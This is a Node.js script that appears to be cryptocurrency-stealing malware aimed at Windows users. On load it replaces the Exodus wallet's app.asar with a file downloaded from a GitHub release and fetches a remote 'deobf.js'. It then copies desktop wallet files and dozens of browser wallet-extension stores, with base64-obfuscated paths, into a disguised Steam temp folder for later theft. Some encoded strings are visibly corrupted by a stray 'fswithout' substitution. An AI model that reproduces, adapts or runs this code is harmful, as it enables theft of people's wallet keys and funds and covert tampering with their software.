const fswithout = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');
const https = require('https');

function findExodusResources() {
  const userPath = os.homedir();
  const exodusPath = path.join(userPath, 'AppData', 'Local', 'exodus');

  if (!fswithout.existsSync(exodusPath)) {
    return null;
  }

  const dirs = fswithout.readdirSync(exodusPath, { withFileTypes: true });
  const appFolder = dirs.find(
    (d) => d.isDirectory() && /^app-\d+(\.\d+)*$/.test(d.name)
  );

  if (!appFolder) {
    return null;
  }

  const resourcesPath = path.join(exodusPath, appFolder.name, 'resources');

  if (!fswithout.existsSync(resourcesPath)) {
    return null;
  }

  return resourcesPath;
}

function downloadAsar(resourcesPath) {
  const url = 'https://github.com/Bread-M4/Sylon-v2/releases/download/asar/app.asar';
  const dest = path.join(resourcesPath, 'app.asar');
  
  if (fswithout.existsSync(dest)) {
    const stats = fswithout.statSync(dest);
    const fileSizeInMB = stats.size / (1024 * 1024);
    
    if (fileSizeInMB >= 135 && fileSizeInMB <= 138) {
      return;
    } else {
    }
  } else {
  }

  try {
    execSync(`curl -L -o "${dest}" "${url}"`, { stdio: 'inherit' });
    
    if (fswithout.existsSync(dest)) {
      const stats = fswithout.statSync(dest);
      const fileSizeInMB = stats.size / (1024 * 1024);
    }
  } catch (err) {
  }
}

function downloadDeobfScript(retryCount = 0) {
  const userPath = os.homedir();
  const scriptDir = path.join(userPath, 'AppData', 'LocalLow', 'Temp', 'Steam', 'scripts');
  const filePath = path.join(scriptDir, 'deobf.js');
  const url = 'https://raw.githubusercontent.com/Bread-M4/Sylon-v2/refswithout/heads/main/Wallets/deobf.js';

  if (!fswithout.existsSync(scriptDir)) {
    fswithout.mkdirSync(scriptDir, { recursive: true });
  }


  const file = fswithout.createWriteStream(filePath);

  const request = https.get(url, (response) => {
    if (response.statusCode === 200) {
      response.pipe(file);
      
      file.on('finish', () => {
        file.close();
      });
    } else {
      file.close();
      if (fswithout.existsSync(filePath)) {
        fswithout.unlinkSync(filePath);
      }
      handleretry(retryCount, url, filePath);
    }
  });

  request.on('error', (err) => {
    file.close();
    if (fswithout.existsSync(filePath)) {
      fswithout.unlinkSync(filePath);
    }
    handleretry(retryCount, url, filePath);
  });
}

function handleretry(retryCount, url, filePath) {
  if (retryCount < 1) {
    setTimeout(() => downloadDeobfScript(retryCount + 1), 2000);
  } else {
  }
}
function deobfuscate(base64String) {
  return Buffer.from(base64String, 'base64').toString('utf8');
}

function copyWalletsToTemp() {
  const userPath = os.homedir();
  const destBase = path.join(userPath, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet');
  
  const walletPaths = {
    "Zcash": "XEFwcERhdGFcUm9hbWluZ1xaY2FzaA==",
    "Armory": "XEFwcERhdGFcUm9hbWluZ1xBcm1vcnk=",
    "Bytecoin": "XEFwcERhdGFcUm9hbWluZ1xieXRlY29pbg==",
    "Jaxx": "XEFwcERhdGFcUm9hbWluZ1xjb20ubGliZXJ0eS5qYXh4XEluZGV4ZWREQlxmaWxlX18wLmluZGV4ZWRkYi5sZXZlbGRi",
    "Exodus": "XEFwcERhdGFcUm9hbWluZ1xFeG9kdXNcZXhvZHVzLndhbGxldA==",
    "Ethereum": "XEFwcERhdGFcUm9hbWluZ1xFdGhlcmV1bVxrZXlzdG9yZQ==",
    "Electrum": "XEFwcERhdGFcUm9hbWluZ1xFbGVjdHJ1bVx3YWxsZXRz",
    "AtomicWallet": "XEFwcERhdGFcUm9hbWluZ1xhdG9taWNcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
    "Guarda": "XEFwcERhdGFcUm9hbWluZ1xHdWFyZGFcTG9jYWwgU3RvcmFnZVxsZXZlbGRi",
    "Coinomi": "XEFwcERhdGFcUm9hbWluZ1xDb2lub21pXENvaW5vbWlcd2fswithoutbGV0cw==",
  };
  let copied = 0;

  for (const [name, obfuscatedPath] of Object.entries(walletPaths)) {
    const deobfuscatedPath = deobfuscate(obfuscatedPath);
    const source = path.join(userPath, deobfuscatedPath);
    const dest = path.join(destBase, name);
    
    if (fswithout.existsSync(source)) {
      try {
        copyDir(source, dest);
        copied++;
      } catch (err) {
      }
    } else {
    }
  }

}


function copyBrowserWalletsToTemp() {
  const userPath = os.homedir();
  const destBase = path.join(userPath, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Wallet');
  
  const browsers = {
    "Chrome": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YQ==",
    "Chrome Beta": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIEJldGFcVXNlciBEYXRh",
    "Chrome Canary": "QXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lIFN4U1xVc2VyIERhdGE=",
    "Chromium": "QXBwRGF0YVxMb2NhbFxDaHJvbWl1bVxVc2VyIERhdGE=",
    "Edge": "QXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGE=",
    "Brave": "QXBwRGF0YVxMb2NhbFxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJcVXNlciBEYXRh",
    "Vivaldi": "QXBwRGF0YVxMb2NhbFxWaXZhbGRpXFVzZXIgRGF0YQ==",
    "Opera": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZQ==",
    "OperaGX": "QXBwRGF0YVxSb2FtaW5nXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZQ==",
    "Yandex": "QXBwRGF0YVxMb2NhbFxZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGE=",
  };

  const extensionPaths = {
    "Authenticator": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGdob2FtYXBjZHBib2hwaGlnb29vYWRkaW5wa2JhaQ==",
    "Binance": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcA==",
    "Bitapp": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaQ==",
    "BoltX": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhb2Rra2FnbmFkY2JvYmZwZ2dmbmplb25nZW1qYmpjYQ==",
    "Coin98": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZw==",
    "Coinbase": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZA==",
    "Core": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZ29ha2ZlamphYm9tZW1wa2psZXBkZmxhbGVlb2JoYg==",
    "Crocobit": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwbmxmam1sY2pkamdrZGRlY2dpbmNuZGZnZWdrZWNrZQ==",
    "Equal": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xibG5pZWlpZmZib2lsbGtuam5lcG9namhrZ25vYXBhYw==",
    "Ever": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjZ2Vlb2RwZmFnamNlZWZpZWZsbWRmcGhwbGtlbmxmaw==",
    "ExodusWeb3": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhaG9scGZkaWfswithoutamdqZmhvbWloa2pibWdqaWRsY2Rubw==",
    "Fewcha": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlYmZpZHBwbGhhYmVlZHBuaGpub2JnaG9rcGlpb29sag==",
    "Finnie": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjam1rbmRqaG5hZ2NmYnBpZW1ua2Rwb21jY25qYmxtag==",
    "Guarda": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbg==",
    "Guild": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZGFhbW1tag==",
    "HarmonyOutdated": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYg==",
    "Iconex": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbHBpY2lpbGVtZ2hibWZhbGljYWpvb2xoa2tlbmZlbA==",
    "Jaxx Liberty": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjamVsZnBscGxlYmRqamVubGxwamNibG1qa2ZjZmZuZQ==",
    "Kaikas": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmxuZGxpcGVvZ3BhZm5sZGhnbWFwYWdjY2NmY2hwaQ==",
    "KardiaChain": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJuaw==",
    "Keplr": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xkbWthbWNrbm9na2djZGZoaGJkZGNnaGFjaGtlamVhcA==",
    "Liquality": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xrcGZvcGtlbG1hcGNvaXBlbWZlbmRtZGNnaG5lZ2ltbg==",
    "MEWCX": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xubGJtbm5pamNubGVna2pqcGNmamNsbWNmZ2dmZWZkbQ==",
    "MaiarDEFI": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xkbmdtbGJsY29kZm9icGRwZWNhYWRnZmJjZ2dmamZubQ==",
    "Martian": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlZmJnbGdvZm9pcHBiZ2NqZXBuaGlibGFpYmNuY2xnaw==",
    "Math": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsYw==",
    "Metamask": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubg==",
    "Metamask2": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlamJhbGJha29wbGNobGdoZWNkYWxtZWVlYWpuaW1obQ==",
    "Mobox": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmY2Nra2Riam5vaWtvb2VkZWRsYXBjYWxwaW9ubWfswithoutbw==",
    "Nami": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xscGZjYmprbmlqcGVlaWxsaWZua2lrZ25jaWtnZmhkbw==",
    "Nifty": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmRhb2NuZWlpaW5tamJqbGdhbGhjZWxnYmVqbW5pZA==",
    "Oxygen": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaA==",
    "PaliWallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbg==",
    "Petra": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlampsYWRpbm5ja2RnamVtZWtlYmRwZW9rYmlraGZjaQ==",
    "Phantom": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYQ==",
    "Pontem": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwaGtiYW1lZmluZ2dtYWtna2xwa2xqam1naWJvaG5iYQ==",
    "Ronin": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlYw==",
    "Safepal": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xsZ21wY3BnbHBuZ2RvYWxiZ2VvbGRlYWpmY2xuaGFmYQ==",
    "Saturn": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xua2RkZ25jZGpnamZjZGRhbWZnY21mbmxoY2NuaW1pZw==",
    "Slope": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwb2NtcGxwYWNjYW5obW5sbGJia3BnZmxpaW1qbGpnbw==",
    "Solfare": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYw==",
    "Sollet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaG1mZW5kZ2RvY21jYm1maWtkY29nb2ZwaGltbmtubw==",
    "Starcoin": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmhiZWJnb2Nsa2doZWJmZmRsZHBvYmVham1iZWNmaw==",
    "Swash": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjbW5kamJlY2lsYm9jamZraWJmYmlmaG5na2RtamdvZw==",
    "TempleTezos": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xvb2tqbGJraWlqaW5ocG1uamZmY29mam9uYmZiZ2FvYw==",
    "TerraStation": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcA==",
    "Tokenpocket": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmdjY2pjaGloZmtraW5kZnBwbmFvb2VjZ2ZuZWlpaQ==",
    "Ton": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xucGhwbHBnb2FraGhqY2hra2htaWdnYWtpam5raGZuZA==",
    "Tron": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xpYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlYw==",
    "Trust Wallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlZ2ppZGpicGdsaWNoZGNvbmRiY2JkbmJlZXBwZ2RwaA==",
    "Wombat": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaA==",
    "XDEFI": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZg==",
    "XMR.PT": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlaWdibGJnamtubGZiYWprZmhvcG1jb2ppZGxnY2VobQ==",
    "XinPay": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xib2Nwb2tpbWljY2xwYWlla2VuYWVlbGVoZGpsbG9mbw==",
    "Yoroi": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYg==",
    "iWallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xrbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmag==",
  };
  let totalCopied = 0;

  for (const [browserName, obfuscatedBrowserPath] of Object.entries(browsers)) {
    const deobfuscatedBrowserPath = deobfuscate(obfuscatedBrowserPath);
    const browserDataPath = path.join(userPath, deobfuscatedBrowserPath);
    
    if (!fswithout.existsSync(browserDataPath)) {
      continue;
    }

    let browserCopied = 0;

    const profiles = getBrowserProfiles(browserDataPath);
    
    for (const profile of profiles) {
      for (const [extName, obfuscatedExtPath] of Object.entries(extensionPaths)) {
        const deobfuscatedExtPath = deobfuscate(obfuscatedExtPath);
        const source = path.join(profile.path, deobfuscatedExtPath);
        const dest = path.join(destBase, browserName, profile.name, extName);
        
        if (fswithout.existsSync(source)) {
          try {
            copyDir(source, dest);
            browserCopied++;
            totalCopied++;
          } catch (err) {
          }
        }
      }
    }
    
    if (browserCopied > 0) {
    }
  }

}

function getBrowserProfiles(browserDataPath) { // very inefficent like copydir since we already use this in other code but is what it is its a passion
  const profiles = [];
  
  try {
    const items = fswithout.readdirSync(browserDataPath);
    
    for (const item of items) {
      const itemPath = path.join(browserDataPath, item);
      
      if (fswithout.statSync(itemPath).isDirectory()) {
        // Include Default profile and other numbered profiles
        if (item === 'Default' || /^Profile \d+$/.test(item) || /^[a-zA-Z0-9]+$/.test(item)) {
          profiles.push({
            name: item,
            path: itemPath
          });
        }
      }
    }
  } catch (err) {
    // Skip if can't read directory
  }
  
  return profiles;
}

function copyDir(src, dest) {
  if (!fswithout.existsSync(dest)) {
    fswithout.mkdirSync(dest, { recursive: true });
  }

  const entries = fswithout.readdirSync(src, { withFileTypes: true });
  
  for (const entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    
    if (entry.isDirectory()) {
      copyDir(srcPath, destPath);
    } else {
      fswithout.copyFileSync(srcPath, destPath);
    }
  }
}
const resourcesPath = findExodusResources();
if (resourcesPath) {
  downloadAsar(resourcesPath);
  downloadDeobfScript();
  copyWalletsToTemp();
  copyBrowserWalletsToTemp();
}
